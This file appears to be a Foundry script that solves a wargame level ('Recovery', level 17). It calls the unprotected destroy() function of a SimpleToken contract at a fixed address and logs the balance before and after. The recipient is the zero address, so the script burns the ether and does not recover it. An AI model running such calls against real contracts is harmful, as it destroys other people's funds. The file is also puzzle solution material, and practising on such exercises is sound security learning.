// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {SimpleToken} from "../src/level17/Recovery.sol";

import "forge-std/console.sol";

contract level17Exploit is Script {
    SimpleToken simpleToken =
        SimpleToken(payable(0x4f563Da6bdc9448A79de4Fe040503D3BD4D7f16B));

    function run() external {
        vm.startBroadcast();

        console.log("balance: ", address(simpleToken).balance);
        simpleToken.destroy(payable(0));
        console.log("balance: ", address(simpleToken).balance);

        vm.stopBroadcast();
    }
}
